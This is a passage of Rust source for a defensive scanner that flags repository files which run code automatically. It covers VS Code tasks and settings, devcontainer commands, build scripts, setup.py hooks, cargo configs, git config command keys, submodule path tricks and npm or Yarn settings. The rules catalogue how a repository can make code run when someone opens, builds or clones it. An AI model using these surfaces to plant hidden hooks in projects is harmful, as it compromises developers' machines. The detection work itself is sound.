/// The tasks of one file by label, and how many the walk has visited.
struct TaskWalk<'a> {
    by_label: HashMap<&'a str, &'a Map>,
    visits: usize,
}

impl<'a> TaskWalk<'a> {
    /// Adds to `out` the commands a task starts, each with the JSON string it came from (to find
    /// its line): the task's own, those of its `windows`, `linux` and `osx` blocks, and those of
    /// the tasks it `dependsOn`. A label already in `seen` is skipped, so a cycle ends.
    fn collect(
        &mut self,
        task: &'a Map,
        seen: &mut HashSet<&'a str>,
        depth: usize,
        out: &mut Vec<(String, String)>,
    ) {
        if depth > MAX_TASK_DEPTH
            || self.visits >= MAX_TASK_VISITS
            || out.len() >= MAX_TASK_COMMANDS
        {
            return;
        }
        self.visits += 1;
        let label = task.get("label").and_then(Value::as_str).unwrap_or("");
        if !label.is_empty() && !seen.insert(label) {
            return;
        }
        out.extend(command_of(task));
        for os in ["windows", "linux", "osx"] {
            if let Some(block) = task.get(os).and_then(Value::as_object) {
                out.extend(command_of(block));
            }
        }
        let deps: Vec<&'a str> = match task.get("dependsOn") {
            Some(Value::Str(s)) => vec![s.as_str()],
            Some(Value::Array(a)) => a.iter().filter_map(Value::as_str).collect(),
            _ => Vec::new(),
        };
        for dep in deps {
            if let Some(target) = self.by_label.get(dep).copied() {
                self.collect(target, seen, depth + 1, out);
            }
        }
    }
}

/// The command line of a task or of one of its platform blocks, with the string it came from.
fn command_of(task: &Map) -> Option<(String, String)> {
    let given = match task.get("command") {
        Some(Value::Object(o)) => o.get("value"),
        other => other,
    };
    // A string, or an array of strings (the words of the command).
    let (mut line, command) = match given {
        Some(Value::Str(s)) => (s.clone(), s.clone()),
        Some(Value::Array(a)) => {
            let words: Vec<String> = a
                .iter()
                .filter_map(|w| w.as_str().map(str::to_string))
                .collect();
            if words.is_empty() {
                return None;
            }
            (join_args(&words), words[0].clone())
        }
        _ => {
            if task.get("type").and_then(Value::as_str) == Some("npm") {
                let script = task.get("script").and_then(Value::as_str)?;
                return Some((format!("npm run {script}"), script.to_string()));
            }
            return None;
        }
    };
    if let Some(args) = task.get("args").and_then(Value::as_array) {
        let words: Vec<String> = args
            .iter()
            .filter_map(|a| match a {
                Value::Str(s) => Some(s.clone()),
                Value::Object(o) => o.get("value").and_then(Value::as_str).map(str::to_string),
                _ => None,
            })
            .collect();
        if !words.is_empty() {
            line = format!("{line} {}", join_args(&words));
        }
    }
    Some((line, command))
}

fn vscode_settings(cx: &mut Cx) {
    let v = match jsonc::parse(cx.text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Settings),
    };
    if let Some(o) = v.as_object() {
        settings_from(cx, o);
    }
}

/// A `*.code-workspace` file: its `settings` block gets the rules of `settings.json` and its
/// `tasks` block those of `tasks.json`.
fn code_workspace(cx: &mut Cx) {
    let v = match jsonc::parse(cx.text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Tasks),
    };
    let Some(o) = v.as_object() else {
        return;
    };
    if let Some(settings) = o.get("settings").and_then(Value::as_object) {
        settings_from(cx, settings);
    }
    if let Some(tasks) = o
        .get("tasks")
        .and_then(Value::as_object)
        .and_then(|t| t.get("tasks"))
        .and_then(Value::as_array)
    {
        let dir = parent(cx.path).to_string();
        tasks_from(cx, tasks, &dir);
    }
}

/// True for the `files.exclude` keys that hide the `.vscode` folder; `.vscode-test` and the like
/// are other folders.
fn hides_vscode(key: &str) -> bool {
    matches!(
        key.trim(),
        ".vscode" | "**/.vscode" | ".vscode/**" | "**/.vscode/**"
    )
}

/// Editor settings that name a program the editor or an extension runs: the explicit keys, and
/// `.path`, `Path`, `.exe` or `.command` keys of the extensions listed here.
const PROGRAM_KEYS: &[&str] = &[
    "python.defaultInterpreterPath",
    "python.pythonPath",
    "typescript.tsdk",
    "eslint.runtime",
    "eslint.nodePath",
    "git.path",
    "rust-analyzer.server.path",
    "go.goroot",
    "dart.sdkPath",
    "deno.path",
    "php.validate.executablePath",
    "ruby.interpreter.commandPath",
    "julia.executablePath",
];
const PROGRAM_PREFIXES: &[&str] = &[
    "python.",
    "rust-analyzer.",
    "clangd.",
    "go.",
    "java.",
    "php.",
    "ruby.",
    "dart.",
    "deno.",
    "julia.",
    "lua.",
    "perl.",
    "cmake.",
    "dotnet.",
    "terraform.",
    "eslint.",
    "prettier.",
    "typescript.",
    "git.",
    "npm.",
    "yarn.",
    "mypy-type-checker.",
    "black-formatter.",
    "pylint.",
    "flake8.",
    "ruff.",
    "isort.",
];

fn is_program_key(key: &str) -> bool {
    PROGRAM_KEYS.contains(&key)
        || (PROGRAM_PREFIXES.iter().any(|p| key.starts_with(p))
            && [".path", "Path", ".exe", ".command", ".runtime"]
                .iter()
                .any(|s| key.ends_with(s)))
}

/// How much a program setting is worth: nothing for a bare name (found on PATH), HIGH for a
/// path into the repo (the repo supplies the program), MEDIUM for a path outside it or one into
/// an installed `node_modules`.
fn program_value_severity(value: &str) -> Option<Severity> {
    let v = value.trim();
    if v.is_empty() || !v.contains(['/', '\\']) && !v.starts_with(['.', '~', '$']) {
        return None;
    }
    let outside = v.starts_with(['/', '~', '\\'])
        || v.as_bytes().get(1) == Some(&b':')
        || v.starts_with("${userHome}")
        || v.starts_with("${env:");
    if outside {
        return Some(Severity::Medium);
    }
    let rel = v
        .trim_start_matches("${workspaceFolder}")
        .trim_start_matches("${workspaceRoot}")
        .trim_start_matches(['/', '\\'])
        .trim_start_matches("./");
    if rel.starts_with("node_modules/") {
        return Some(Severity::Medium);
    }
    Some(Severity::High)
}

/// The rules of an editor settings object (`.vscode/settings.json`, or the `settings` block of a
/// workspace file).
fn settings_from(cx: &mut Cx, o: &Map) {
    let text = cx.text;
    let mut worst: Option<(Severity, &str, String)> = None;
    for (key, value) in o.iter().filter(|(k, _)| is_program_key(k)).take(200) {
        let Some(sev) = value.as_str().and_then(program_value_severity) else {
            continue;
        };
        if worst.as_ref().is_none_or(|(s, _, _)| sev > *s) {
            worst = Some((
                sev,
                key,
                format!("{key} = {}", value.as_str().unwrap_or("")),
            ));
        }
    }
    if let Some((severity, key, seen)) = worst {
        let why = if severity == Severity::High {
            "An editor setting names a program inside the repo, so the editor or an extension \
             runs code the repo supplies as soon as the folder opens."
        } else {
            "An editor setting names a program outside the repo for the editor or an extension \
             to run."
        };
        cx.find(
            severity,
            "autorun.vscode-program",
            key_line(text, 0, key),
            why,
            &seen,
            READ_FIRST,
        );
    }
    let hides = o
        .get("files.exclude")
        .and_then(Value::as_object)
        .is_some_and(|ex| {
            ex.iter()
                .any(|(k, val)| hides_vscode(k) && val.as_bool() != Some(false))
        });
    if hides {
        cx.find(
            Severity::High,
            "autorun.vscode-hidden",
            key_line(text, 0, "files.exclude"),
            "The editor settings hide the .vscode folder from the file tree, so the tasks \
             inside it cannot be seen.",
            "files.exclude",
            READ_FIRST,
        );
    }
    if let Some((key, _)) = o
        .iter()
        .find(|(k, _)| k.starts_with("terminal.integrated.env."))
    {
        cx.find(
            Severity::Medium,
            "autorun.vscode-env",
            key_line(text, 0, key),
            "The editor settings set environment variables for every integrated terminal, \
             which can change what the commands you run there do.",
            key,
            READ_FIRST,
        );
    }
}

// Devcontainer

fn devcontainer(cx: &mut Cx) {
    let text = cx.text;
    let v = match jsonc::parse(text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Devcontainer),
    };
    let Some(o) = v.as_object() else {
        return;
    };
    let dir = if base(cx.path) == ".devcontainer.json" {
        parent(cx.path)
    } else {
        dir_above(cx.path, ".devcontainer").unwrap_or("")
    }
    .to_string();
    if let Some(init) = o.get("initializeCommand") {
        let line = key_line(text, 0, "initializeCommand");
        for command in command_values(init) {
            cx.surface(
                "autorun.devcontainer-host",
                Trigger::Open,
                &command,
                line,
                &dir,
                Severity::Info,
            );
        }
    }
    let flat = |key: &str| o.get(key).map(|v| format!("{v:?}")).unwrap_or_default();
    let run_args = flat("runArgs");
    let mut reasons: Vec<&str> = Vec::new();
    if o.get("privileged").and_then(Value::as_bool) == Some(true)
        || run_args.contains("--privileged")
    {
        reasons.push("runs privileged");
    }
    if ["mounts", "workspaceMount", "runArgs"]
        .iter()
        .any(|k| flat(k).contains("docker.sock"))
    {
        reasons.push("mounts the Docker socket");
    }
    let cap_admin = o.get("capAdd").and_then(Value::as_array).is_some_and(|a| {
        a.iter()
            .filter_map(Value::as_str)
            .any(|c| c.eq_ignore_ascii_case("SYS_ADMIN"))
    });
    if cap_admin || run_args.to_ascii_uppercase().contains("SYS_ADMIN") {
        reasons.push("adds the SYS_ADMIN capability");
    }
    if !reasons.is_empty() {
        let line = [
            "privileged",
            "mounts",
            "workspaceMount",
            "capAdd",
            "runArgs",
        ]
        .iter()
        .map(|k| key_line(text, 0, k))
        .filter(|l| *l > 0)
        .min()
        .unwrap_or(0);
        cx.find(
            Severity::Medium,
            "autorun.devcontainer-privileged",
            line,
            &format!(
                "The container {}, which gives code inside it a way to reach the host.",
                reasons.join(" and ")
            ),
            &reasons.join("; "),
            READ_FIRST,
        );
    }
}

/// The commands a lifecycle value holds: a string, an argument array, or an object of either.
/// An object nested deeper is not read.
fn command_values(v: &Value) -> Vec<String> {
    match v {
        Value::Object(o) => o.iter().flat_map(|(_, v)| command_value(v)).collect(),
        other => command_value(other),
    }
}

fn command_value(v: &Value) -> Vec<String> {
    match v {
        Value::Str(s) => vec![s.clone()],
        Value::Array(items) => {
            let words: Vec<String> = items
                .iter()
                .filter_map(|i| i.as_str().map(str::to_string))
                .collect();
            if words.len() == items.len() && !words.is_empty() {
                vec![join_args(&words)]
            } else {
                Vec::new()
            }
        }
        _ => Vec::new(),
    }
}

// Build files and recipe files

/// Makefile, `*.mk`, `*.m4` and `configure`: the lines that download and run, or decode and run.
fn build_script(cx: &mut Cx) {
    let dir = parent(cx.path).to_string();
    let dnl = base(cx.path).ends_with(".m4");
    for l in logical_lines(cx.text, dnl) {
        if matches!(
            shape::classify(&l.text),
            Shape::FetchExec | Shape::DecodeExec
        ) {
            cx.surface(
                "autorun.build-script",
                Trigger::Build,
                &l.text,
                l.line,
                &dir,
                Severity::Info,
            );
        }
    }
}

/// `.envrc`, a husky hook or a Justfile: every command line is an opt-in surface. A Justfile
/// (`recipes_only`) counts only the indented lines, which are the recipe bodies.
fn shell_surfaces(cx: &mut Cx, rule: &'static str, recipes_only: bool) {
    let dir = match dir_above(cx.path, ".husky") {
        Some(root) => root.to_string(),
        None => parent(cx.path).to_string(),
    };
    for l in logical_lines(cx.text, false) {
        if !recipes_only || l.indented {
            cx.surface(rule, Trigger::OptIn, &l.text, l.line, &dir, Severity::Info);
        }
    }
}

/// `entry:` of a hook with `language: system`, which runs a program of the machine on commit.
fn pre_commit(cx: &mut Cx) {
    let lines: Vec<&str> = cx.text.lines().collect();
    let dir = parent(cx.path).to_string();
    for (i, raw) in lines.iter().enumerate() {
        let t = raw.trim_start();
        let Some(after) = t.strip_prefix('-') else {
            continue;
        };
        if !after.is_empty() && !after.starts_with(' ') {
            continue;
        }
        let dash = raw.len() - t.len();
        let first = after.trim_start();
        let key_indent = dash + 1 + (after.len() - first.len());
        let mut keys: Vec<(usize, &str, String)> = Vec::new();
        if let Some((k, v)) = yaml_kv(first) {
            keys.push((i + 1, k, v));
        }
        for (j, l) in lines.iter().enumerate().skip(i + 1).take(200) {
            let c = l.trim_start();
            if c.is_empty() || c.starts_with('#') {
                continue;
            }
            let indent = l.len() - c.len();
            if indent <= dash {
                break;
            }
            if indent == key_indent
                && let Some((k, v)) = yaml_kv(c)
            {
                keys.push((j + 1, k, v));
            }
        }
        let system = keys
            .iter()
            .any(|(_, k, v)| *k == "language" && matches!(v.as_str(), "system" | "unsupported"));
        let entry = keys.iter().find(|(_, k, _)| *k == "entry");
        if system
            && let Some((line, _, value)) = entry
            && !is_block(value)
        {
            cx.surface(
                "autorun.pre-commit-hook",
                Trigger::OptIn,
                value,
                *line,
                &dir,
                Severity::Info,
            );
        }
    }
}

/// `cmd:` values and the plain string items of `cmds:` in a Taskfile.
fn taskfile(cx: &mut Cx) {
    let lines: Vec<&str> = cx.text.lines().collect();
    let dir = parent(cx.path).to_string();
    let add = |cx: &mut Cx, line: usize, command: &str| {
        cx.surface(
            "autorun.taskfile",
            Trigger::OptIn,
            command,
            line,
            &dir,
            Severity::Info,
        );
    };
    for (i, raw) in lines.iter().enumerate() {
        let t = raw.trim_start();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let indent = raw.len() - t.len();
        let inner = t.strip_prefix("- ").map_or(t, str::trim_start);
        let Some((key, value)) = yaml_kv(inner) else {
            continue;
        };
        if key == "cmd" {
            if is_block(&value) {
                for (line, body) in block_lines(&lines, i, indent) {
                    add(cx, line, &body);
                }
            } else {
                add(cx, i + 1, &value);
            }
        } else if key == "cmds" && value.is_empty() && !t.starts_with('-') {
            let mut item_indent = None;
            for (j, l) in lines.iter().enumerate().skip(i + 1) {
                let c = l.trim_start();
                if c.is_empty() || c.starts_with('#') {
                    continue;
                }
                let ind = l.len() - c.len();
                if ind < indent || (ind == indent && !c.starts_with("- ")) {
                    break;
                }
                let Some(item) = c.strip_prefix("- ") else {
                    continue;
                };
                if *item_indent.get_or_insert(ind) != ind {
                    continue;
                }
                let item = item.trim_start();
                if yaml_kv(item).is_some_and(|(k, _)| is_identifier(k)) {
                    continue;
                }
                let scalar = yaml_scalar(item);
                if is_block(&scalar) {
                    for (line, body) in block_lines(&lines, j, ind) {
                        add(cx, line, &body);
                    }
                } else {
                    add(cx, j + 1, &scalar);
                }
            }
        }
    }
    cx.found.sort_by_key(|s| s.line);
}

fn is_identifier(key: &str) -> bool {
    let mut chars = key.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

static MSBUILD_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)<Exec\b(?:[^>"']|"[^"]*"|'[^']*')*?\bCommand\s*=\s*(?:"([^"]*)"|'([^']*)')"#)
        .expect("pattern compiles")
});

static MSBUILD_EVENT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?is)<(?:Pre|Post)BuildEvent\b[^>]*>(.*?)</(?:Pre|Post)BuildEvent>")
        .expect("pattern compiles")
});

static XML_ENTITY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"&(#[xX][0-9a-fA-F]+|#[0-9]+|amp|lt|gt|quot|apos);").expect("pattern compiles")
});

fn xml_decode(s: &str) -> String {
    XML_ENTITY
        .replace_all(s, |c: &Captures| {
            let entity = &c[1];
            let decoded = match entity {
                "amp" => Some('&'),
                "lt" => Some('<'),
                "gt" => Some('>'),
                "quot" => Some('"'),
                "apos" => Some('\''),
                _ => {
                    let number = match entity.strip_prefix(['#']) {
                        Some(n) => match n.strip_prefix(['x', 'X']) {
                            Some(hex) => u32::from_str_radix(hex, 16).ok(),
                            None => n.parse().ok(),
                        },
                        None => None,
                    };
                    number.and_then(char::from_u32)
                }
            };
            decoded.map_or_else(|| c[0].to_string(), |ch| ch.to_string())
        })
        .into_owned()
}

/// `<Exec Command=…>`, `<PreBuildEvent>` and `<PostBuildEvent>` of an MSBuild file.
fn msbuild(cx: &mut Cx) {
    let text = cx.text;
    let dir = parent(cx.path).to_string();
    // Each command with the byte offset where it starts, then in source order.
    let mut commands: Vec<(usize, String)> = Vec::new();
    for c in MSBUILD_EXEC.captures_iter(text) {
        let Some(m) = c.get(1).or_else(|| c.get(2)) else {
            continue;
        };
        let at = c.get(0).map_or(0, |w| w.start());
        commands.push((at, xml_decode(m.as_str())));
    }
    for c in MSBUILD_EVENT.captures_iter(text) {
        let Some(m) = c.get(1) else {
            continue;
        };
        let mut at = m.start();
        for raw in m.as_str().split('\n') {
            commands.push((at, xml_decode(raw)));
            at += raw.len() + 1;
        }
    }
    commands.sort_by_key(|(at, _)| *at);
    // One pass over the text for every line number.
    let (mut line, mut pos) = (1, 0);
    for (at, command) in commands {
        line += text.as_bytes()[pos..at]
            .iter()
            .filter(|b| **b == b'\n')
            .count();
        pos = at;
        cx.surface(
            "autorun.msbuild-exec",
            Trigger::Build,
            &command,
            line,
            &dir,
            Severity::Info,
        );
    }
}

// Python and Rust build hooks

static CMDCLASS_OPEN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bcmdclass\s*=\s*(\{|dict\s*\()").expect("pattern compiles"));

static CMDCLASS_KEY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"["']?\b(?:install|develop|egg_info)\b["']?\s*[:=]"#).expect("pattern compiles")
});

static CMDCLASS_ITEM: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\bcmdclass\s*\[\s*["'](?:install|develop|egg_info)["']\s*\]"#)
        .expect("pattern compiles")
});

/// The text of the bracket pair that opens at `open` (a `{` or `(`), cut at 4,000 bytes.
fn bracket_window(text: &str, open: usize) -> &str {
    let mut depth = 0usize;
    for (i, b) in text.bytes().enumerate().skip(open).take(4000) {
        match b {
            b'{' | b'(' => depth += 1,
            b'}' | b')' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return &text[open..=i];
                }
            }
            _ => {}
        }
    }
    let end = (open + 4000).min(text.len());
    let end = (open..=end)
        .rev()
        .find(|e| text.is_char_boundary(*e))
        .unwrap_or(open);
    &text[open..end]
}

fn setup_py(cx: &mut Cx) {
    let text = cx.text;
    // setup.py runs on every install, with or without a cmdclass, so it is always a surface: the
    // orchestrator raises it when a file it runs, or setup.py itself, holds a HIGH finding.
    let dir = parent(cx.path).to_string();
    cx.surface(
        "autorun.setup-py",
        Trigger::Install,
        "python setup.py",
        1,
        &dir,
        Severity::Info,
    );
    let mut hit: Option<usize> = CMDCLASS_ITEM.find(text).map(|m| m.start());
    for c in CMDCLASS_OPEN.captures_iter(text).take(100) {
        let (Some(whole), Some(open)) = (c.get(0), c.get(1)) else {
            continue;
        };
        // `dict(` ends at its `)`; `{` at its `}`: both start at the bracket itself.
        let bracket = open.end() - 1;
        if CMDCLASS_KEY.is_match(bracket_window(text, bracket)) {
            hit = Some(hit.map_or(whole.start(), |h| h.min(whole.start())));
        }
    }
    if let Some(at) = hit {
        cx.find(
            Severity::Medium,
            "autorun.setup-py-cmdclass",
            line_at(text, at),
            "setup.py replaces the install, develop or egg_info command, so its own code runs \
             when someone installs the package.",
            "cmdclass",
            READ_FIRST,
        );
    }
}

fn pyproject(cx: &mut Cx) {
    let hit = tomlish::entries(cx.text)
        .into_iter()
        .find(|e| &*e.table == "build-system" && e.key == "backend-path");
    if let Some(e) = hit {
        cx.find(
            Severity::Medium,
            "autorun.pyproject-backend-path",
            e.line,
            "The build backend is loaded from a folder of this repo, so its code runs when \
             the package is built or installed.",
            &format!("backend-path = {}", e.value),
            READ_FIRST,
        );
    }
}

/// HIGH for a program given as a path (it is a file of the repo), MEDIUM for a bare name that
/// PATH resolves (sccache, probe-rs, wasmtime). The program is the first word of a string, or the
/// first item of an array.
fn program_severity(value: &str) -> Severity {
    let v = value.trim().trim_start_matches('[').trim_start();
    let first = v
        .trim_start_matches(['"', '\''])
        .split(['"', '\'', ' ', ',', '\t'])
        .next()
        .unwrap_or("");
    if first.is_empty() || first.contains(['/', '\\']) || first.starts_with(['.', '$']) {
        Severity::High
    } else {
        Severity::Medium
    }
}

fn cargo_config(cx: &mut Cx) {
    let mut strongest: Option<(Severity, usize, String)> = None;
    let mut reasons: Vec<&str> = Vec::new();
    for e in tomlish::entries(cx.text) {
        if e.table.len() > 256 || e.key.len() > 256 {
            continue;
        }
        let at = if e.table.is_empty() {
            e.key.clone()
        } else {
            format!("{}.{}", e.table, e.key)
        };
        let (severity, why) = if matches!(
            at.as_str(),
            "build.rustc" | "build.rustc-wrapper" | "build.rustc-workspace-wrapper"
        ) || (at.starts_with("target.") && at.ends_with(".runner"))
        {
            (
                program_severity(&e.value),
                "names a program that cargo runs in place of rustc or the tests",
            )
        } else if at == "env" || at.starts_with("env.") {
            (
                Severity::Medium,
                "sets environment variables for every cargo run",
            )
        } else if at.starts_with("source.") {
            (Severity::Medium, "replaces where cargo fetches crates from")
        } else {
            continue;
        };
        if !reasons.contains(&why) {
            reasons.push(why);
        }
        if strongest.as_ref().is_none_or(|(s, _, _)| severity > *s) {
            strongest = Some((severity, e.line, format!("{at} = {}", e.value)));
        }
    }
    if let Some((severity, line, seen)) = strongest {
        cx.find(
            severity,
            "autorun.cargo-config",
            line,
            &format!("This cargo config {}.", reasons.join(", and ")),
            &seen,
            READ_FIRST,
        );
    }
}

fn rust_toolchain(cx: &mut Cx) {
    let hit = tomlish::entries(cx.text)
        .into_iter()
        .find(|e| &*e.table == "toolchain" && e.key == "path");
    if let Some(e) = hit {
        cx.find(
            Severity::High,
            "autorun.rust-toolchain-path",
            e.line,
            "The toolchain is a folder of this repo, so rustup runs a compiler the repo ships.",
            &format!("path = {}", e.value),
            READ_FIRST,
        );
    }
}

// Wrappers that download a tool

/// A wrapper properties file whose download URL (any of `keys`) is not on `official`. One finding.
fn wrapper_properties(cx: &mut Cx, rule: &str, keys: &[&str], official: &str) {
    for e in ini_entries(cx.text) {
        if !keys.contains(&e.key.as_str()) {
            continue;
        }
        let url = e.value.replace("\\:", ":").replace("\\=", "=");
        if url_host(&url) != official {
            cx.find(
                Severity::High,
                rule,
                e.line,
                &format!(
                    "The wrapper downloads its tool from a host other than {official}, and \
                     runs what it gets."
                ),
                &format!("{} = {}", e.key, e.value),
                READ_FIRST,
            );
            return;
        }
    }
}

// Git files

fn gitmodules(cx: &mut Cx) {
    let entries = ini_entries(cx.text);
    let in_submodule = |e: &&Ini| {
        e.section
            .as_bytes()
            .get(..9)
            .is_some_and(|b| b.eq_ignore_ascii_case(b"submodule"))
    };
    // The entries of one section share an `Rc`, so a pointer says when a new section starts.
    let mut submodules = 0;
    let mut last: Option<&Rc<str>> = None;
    for e in entries.iter().filter(in_submodule) {
        if last.is_none_or(|l| !Rc::ptr_eq(l, &e.section)) {
            submodules += 1;
            last = Some(&e.section);
        }
    }
    if submodules == 0 {
        return;
    }
    let mut reasons: Vec<&str> = Vec::new();
    let mut first: Option<(usize, String)> = None;
    for e in entries.iter().filter(in_submodule) {
        let reason = match e.key.as_str() {
            "path" if e.value.contains('\r') => "a path holds a carriage return",
            "path" if e.value.split(['/', '\\']).any(|p| p == "..") => "a path climbs out with ..",
            "url" if !url_is_https_or_ssh(unquote(&e.value)) => "a URL is not https or ssh",
            _ => continue,
        };
        if !reasons.contains(&reason) {
            reasons.push(reason);
        }
        first.get_or_insert((e.line, format!("{} = {}", e.key, e.value)));
    }
    match first {
        Some((line, seen)) => cx.find(
            Severity::High,
            "autorun.gitmodules",
            line,
            &format!(
                "A submodule entry is built to write outside its folder or to reach git by an \
                 unusual door: {}.",
                reasons.join("; ")
            ),
            &seen,
            "Do not clone this repo with --recurse-submodules or update its submodules.",
        ),
        None => cx.find(
            Severity::Info,
            "autorun.gitmodules",
            0,
            &format!("The repo lists {submodules} submodule(s)."),
            "",
            "Submodules are fetched from other repos; check each one before you update.",
        ),
    }
}

fn url_is_https_or_ssh(url: &str) -> bool {
    static SCP_LIKE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^[A-Za-z0-9._-]+@[A-Za-z0-9.-]+:").expect("pattern compiles")
    });
    let lower = url.to_ascii_lowercase();
    // A relative URL is read against the remote of the repo itself.
    ["https://", "ssh://", "./", "../"]
        .iter()
        .any(|p| lower.starts_with(p))
        || SCP_LIKE.is_match(url)
}

fn gitattributes(cx: &mut Cx) {
    let mut names: Vec<&str> = Vec::new();
    let mut first = 0;
    for (i, raw) in cx.text.lines().enumerate() {
        let t = raw.trim();
        if t.starts_with('#') {
            continue;
        }
        for name in t
            .split_whitespace()
            .skip(1)
            .filter_map(|tok| tok.strip_prefix("filter="))
            .filter(|n| !n.is_empty())
        {
            if names.is_empty() {
                first = i + 1;
            }
            if !names.contains(&name) {
                names.push(name);
            }
        }
    }
    if !names.is_empty() {
        let seen = names.join(" ");
        cx.find(
            Severity::Low,
            "autorun.gitattributes-filter",
            first,
            "A filter attribute runs the command a user configured for it whenever git checks \
             files in or out; this repo does not set one up by itself.",
            &seen,
            "Do not configure these filters from instructions in the repo.",
        );
    }
}

fn is_git_bool(v: &str) -> bool {
    matches!(
        v.to_ascii_lowercase().as_str(),
        "" | "true" | "false" | "yes" | "no" | "on" | "off" | "0" | "1"
    )
}

/// `.git/config` as it came in the tree: settings that make git run a command.
fn git_config(cx: &mut Cx) {
    // The strongest hit of each rule: level, line and what was seen.
    let mut command: Option<(Severity, usize, String)> = None;
    let mut include: Option<(usize, String)> = None;
    // The name of the current section, worked out once per section: a header can be huge.
    let mut current: Option<(Rc<str>, String)> = None;
    for e in ini_entries(cx.text) {
        if current
            .as_ref()
            .is_none_or(|(s, _)| !Rc::ptr_eq(s, &e.section))
        {
            // The section's own name is short; a long one cannot be a name git reads. It ends at
            // a space (`[filter "x"]`) or a dot (`[filter.x]`).
            let name = e
                .section
                .split([' ', '\t', '.'])
                .next()
                .filter(|w| w.len() <= 16)
                .unwrap_or("")
                .to_ascii_lowercase();
            current = Some((Rc::clone(&e.section), name));
        }
        let name = current.as_ref().map_or("", |(_, n)| n.as_str());
        let key = e.key.to_ascii_lowercase();
        let value = unquote(&e.value);
        let seen = || format!("{}.{} = {}", name, e.key, e.value);
        let level = match (name, key.as_str()) {
            ("include" | "includeif", "path") => {
                include.get_or_insert((e.line, seen()));
                continue;
            }
            ("core", "fsmonitor") => (!is_git_bool(value)).then_some(Severity::High),
            // husky points the hooks path at its own folder; its hooks are rated as files.
            ("core", "hookspath") if matches!(value, ".husky" | ".husky/_") => Some(Severity::Low),
            ("core", "sshcommand" | "pager" | "editor" | "hookspath" | "askpass" | "gitproxy")
            | ("filter", "clean" | "smudge" | "process")
            | ("diff", "textconv" | "external" | "command")
            | ("merge", "driver")
            | ("sequence", "editor")
            | ("gpg", "program")
            | ("remote", "uploadpack" | "receivepack") => Some(Severity::High),
            ("credential", "helper") => {
                let first = value.split_whitespace().next().unwrap_or("");
                (!SAFE_CREDENTIAL_HELPERS.contains(&first)).then_some(Severity::High)
            }
            ("alias", _) | ("submodule", "update") => {
                value.starts_with('!').then_some(Severity::High)
            }
            _ => None,
        };
        if let Some(level) = level
            && command.as_ref().is_none_or(|(s, _, _)| level > *s)
        {
            command = Some((level, e.line, seen()));
        }
    }
    if let Some((severity, line, seen)) = command {
        let why = if severity == Severity::Low {
            "The git config points the hooks path at the folder husky installs its hooks in; \
             the hooks there are listed as files."
        } else {
            "The git config in the repo's .git folder names a command that git runs on \
             ordinary commands such as status, diff and checkout."
        };
        cx.find(
            severity,
            "autorun.git-config-command",
            line,
            why,
            &seen,
            "Do not run git in this folder. Read the git config first.",
        );
    }
    if let Some((line, seen)) = include {
        cx.find(
            Severity::High,
            "autorun.git-config-include",
            line,
            "The git config pulls in another file, which can set any of the commands git runs. \
             A fresh clone has no include.",
            &seen,
            "Do not run git in this folder. Read the included file first.",
        );
    }
}

/// Credential helpers git ships or the platforms install.
const SAFE_CREDENTIAL_HELPERS: &[&str] = &[
    "",
    "cache",
    "store",
    "osxkeychain",
    "manager",
    "manager-core",
    "libsecret",
    "wincred",
    "gnome-keyring",
    "netrc",
];

// Package manager settings

fn npmrc(cx: &mut Cx) {
    let mut hits: Vec<(usize, String)> = Vec::new();
    for e in ini_entries(cx.text) {
        let key = e.key.to_ascii_lowercase();
        let value = unquote(&e.value);
        let flagged = match key.as_str() {
            "ignore-scripts" => value.eq_ignore_ascii_case("false"),
            "script-shell" | "node-options" => !value.is_empty(),
            k if k == "registry" || k.ends_with(":registry") => {
                !value.is_empty() && url_host(value) != "registry.npmjs.org"
            }
            _ => false,
        };
        if flagged {
            hits.push((e.line, format!("{} = {}", e.key, e.value)));
        }
    }
    if let Some((line, seen)) = hits.first() {
        let keys: Vec<&str> = hits
            .iter()
            .filter_map(|(_, s)| s.split(" = ").next())
            .collect();
        cx.find(
            Severity::Medium,
            "autorun.npmrc",
            *line,
            &format!(
                "This .npmrc changes what npm runs or where it downloads from: {}.",
                keys.join(", ")
            ),
            seen,
            READ_FIRST,
        );
    }
}

/// `yarnPath` of `.yarnrc.yml` or `yarn-path` of `.yarnrc`: Yarn runs that file instead of its own.
fn yarn_path(cx: &mut Cx) {
    let yml = base(cx.path) == ".yarnrc.yml";
    for (i, raw) in cx.text.lines().enumerate() {
        let t = raw.trim();
        let value = if yml {
            yaml_kv(t).filter(|(k, _)| *k == "yarnPath").map(|(_, v)| v)
        } else {
            t.strip_prefix("yarn-path")
                .filter(|r| r.starts_with([' ', '\t', ':', '=']))
                .map(|r| yaml_scalar(r.trim_start_matches([' ', '\t', ':', '='])))
        };
        let Some(value) = value.filter(|v| !v.is_empty()) else {
            continue;
        };
        if !is_under_releases(&value) {
            cx.find(
                Severity::High,
                "autorun.yarn-path",
                i + 1,
                "Yarn is pointed at a script outside .yarn/releases, and runs that script on \
                 every yarn command.",
                &value,
                READ_FIRST,
            );
            return;
        }
    }
}

/// True when `path`, with `.` and `..` resolved, stays inside `.yarn/releases/`.
fn is_under_releases(path: &str) -> bool {
    let path = path.replace('\\', "/");
    if path.starts_with('/') || path.as_bytes().get(1) == Some(&b':') {
        return false;
    }
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                if parts.pop().is_none() {
                    return false;
                }
            }
            p => parts.push(p),
        }
    }
    parts.len() > 2 && parts[0] == ".yarn" && parts[1] == "releases"
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shape;
    use crate::{FileKind, Group, Severity, Trigger};

    fn ctx<'a>(path: &'a str, text: &'a str) -> FileCtx<'a> {
        FileCtx {
            path,
